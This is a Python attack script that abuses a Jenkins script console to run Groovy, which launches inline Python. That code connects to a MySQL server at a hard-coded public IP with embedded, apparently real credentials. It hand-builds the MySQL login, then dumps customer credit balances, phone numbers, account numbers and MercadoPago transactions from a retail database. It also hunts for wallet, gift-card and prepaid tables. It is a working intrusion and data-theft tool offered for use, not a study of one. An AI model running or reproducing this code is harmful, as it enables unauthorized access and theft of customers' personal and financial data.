import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from jenkins_exec import jenkins_exec

GROOVY = r'''
def r = ["bash","-c","""python -c "
import sys,socket,struct,hashlib
reload(sys);sys.setdefaultencoding('utf-8')
HOST='187.191.91.37';PORT=3306;USER='adaxxidb';PASS='JTQ6PrkecY3y1kVN'
s=socket.socket();s.settimeout(20);s.connect((HOST,PORT))
d=b''
while True:
 ch=s.recv(4096)
 if not ch:break
 d+=ch
 if len(d)>=4:
  pl=ord(d[0])+(ord(d[1])<<8)+(ord(d[2])<<16)
  if len(d)>=pl+4:break
i=5
while ord(d[i:i+1])!=0:i+=1
i+=1
tid=struct.unpack('<I',d[i:i+4])[0];i+=4
salt1=d[i:i+8];i+=9
caps=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=1
status=struct.unpack('<H',d[i:i+2])[0];i+=2
caps2=struct.unpack('<H',d[i:i+2])[0];i+=2
i+=11
salt2=d[i:i+12]
salt=salt1+salt2
p1=hashlib.sha1(PASS).digest()
p2=hashlib.sha1(p1).digest()
p3=hashlib.sha1(salt+p2).digest()
xor=bytearray(20)
for j in range(20):xor[j]=ord(p1[j])^ord(p3[j])
capf=0x0003f7cf
pkt=struct.pack('<I',capf)+struct.pack('<I',1<<24)+chr(33)+chr(0)*23+USER+chr(0)+chr(20)+str(bytes(xor))+'tienda'+chr(0)
s.send(struct.pack('<I',len(pkt))[:3]+chr(1)+pkt)
r2=s.recv(4096)
if ord(r2[4])!=0:
 print('AUTH FAIL');sys.exit(1)
print('AUTH OK')
def q(sk,sql):
 d=sql.encode('utf-8')
 sk.send(struct.pack('<I',len(d)+1)[:3]+chr(0)+chr(3)+d)
 r=b''
 import time;time.sleep(0.5)
 while True:
  try:
   ch=sk.recv(65536)
   if not ch:break
   r+=ch
   if len(ch)<65536:break
  except:break
 return r
def extract_strings(raw):
 out=[]
 i=0
 while i<len(raw):
  if 32<=ord(raw[i:i+1])<127:
   s=''
   while i<len(raw) and 32<=ord(raw[i:i+1])<127:
    s+=raw[i];i+=1
   if len(s)>1:out.append(s)
  else:i+=1
 return out

# 1. TOP credito_clarotel_credcliente by highest credito_disponible
print('=== TOP 20 credcliente by credito_disponible DESC ===')
raw1=q(s,'SELECT id_cc_credcliente,id_cliente,telefono,credito_disponible,limite_credito,saldo_credito,saldo_ws,numero_cuenta,fecha_alta FROM tienda.credito_clarotel_credcliente ORDER BY credito_disponible DESC LIMIT 20')
strs1=extract_strings(raw1)
for x in strs1:print('  '+x)

# 2. TOP by saldo_credito
print('\\n=== TOP 20 credcliente by saldo_credito DESC ===')
raw2=q(s,'SELECT id_cc_credcliente,id_cliente,telefono,credito_disponible,limite_credito,saldo_credito,saldo_ws,numero_cuenta FROM tienda.credito_clarotel_credcliente ORDER BY saldo_credito DESC LIMIT 20')
strs2=extract_strings(raw2)
for x in strs2:print('  '+x)

# 3. Stats
print('\\n=== STATS credcliente ===')
raw3=q(s,'SELECT COUNT(*) as total, SUM(credito_disponible) as sum_disp, SUM(saldo_credito) as sum_saldo, MAX(credito_disponible) as max_disp, MAX(saldo_credito) as max_saldo FROM tienda.credito_clarotel_credcliente')
strs3=extract_strings(raw3)
for x in strs3:print('  '+x)

# 4. credito_clarotel_lineac top by saldo
print('\\n=== TOP 15 lineac by limite_cred_tel DESC ===')
raw4=q(s,'SELECT id_cc_linea,id_cliente,telefono,monto_total,limite_cred_tel,saldo_cred_tel,saldo_sanborns,saldo_sears,saldo_claro,estado_linea FROM tienda.credito_clarotel_lineac ORDER BY limite_cred_tel DESC LIMIT 15')
strs4=extract_strings(raw4)
for x in strs4:print('  '+x)

# 5. Count lineac
print('\\n=== COUNT lineac ===')
raw5=q(s,'SELECT COUNT(*) FROM tienda.credito_clarotel_lineac')
strs5=extract_strings(raw5)
for x in strs5:print('  '+x)

# 6. mercadopago_transacciones sample + count
print('\\n=== COUNT mercadopago_transacciones ===')
raw6=q(s,'SELECT COUNT(*) FROM tienda.mercadopago_transacciones')
strs6=extract_strings(raw6)
for x in strs6:print('  '+x)
print('\\n=== TOP 10 mercadopago_transacciones ===')
raw7=q(s,'SELECT Id,Id_Pago,Num_Pedido,Estado,Id_Cliente,Fecha FROM tienda.mercadopago_transacciones ORDER BY Id DESC LIMIT 10')
strs7=extract_strings(raw7)
for x in strs7:print('  '+x)

# 7. Search for claropay/wallet configs in ALL tables
print('\\n=== SEARCH FOR claropay/wallet in information_schema ===')
sql8='SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME LIKE '+chr(39)+'%claropay%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%wallet%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%gift%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%voucher%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%tarjeta_regalo%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%bonificacion%'+chr(39)+' OR TABLE_NAME LIKE '+chr(39)+'%prepago%'+chr(39)
raw8=q(s,sql8)
strs8=extract_strings(raw8)
for x in strs8:print('  '+x)

# 8. tag_prepago tables
print('\\n=== DESCRIBE tienda.tag_prepago ===')
raw9=q(s,'DESCRIBE tienda.tag_prepago')
strs9=extract_strings(raw9)
for x in strs9:print('  '+x)

# 9. tag_prepago count + sample
print('\\n=== COUNT + TOP tag_prepago ===')
rawA=q(s,'SELECT COUNT(*) FROM tienda.tag_prepago')
strsA=extract_strings(rawA)
for x in strsA:print('  '+x)
rawB=q(s,'SELECT * FROM tienda.tag_prepago ORDER BY 1 DESC LIMIT 10')
strsB=extract_strings(rawB)
for x in strsB:print('  '+x)

s.close()
" 2>&1"""].execute().text
println r
'''

print("[*] Executing Groovy on Jenkins (monedero DB query)...")
try:
    out = jenkins_exec(GROOVY)
    print(out)
except Exception as e:
    print(f"[!] Error: {e}")
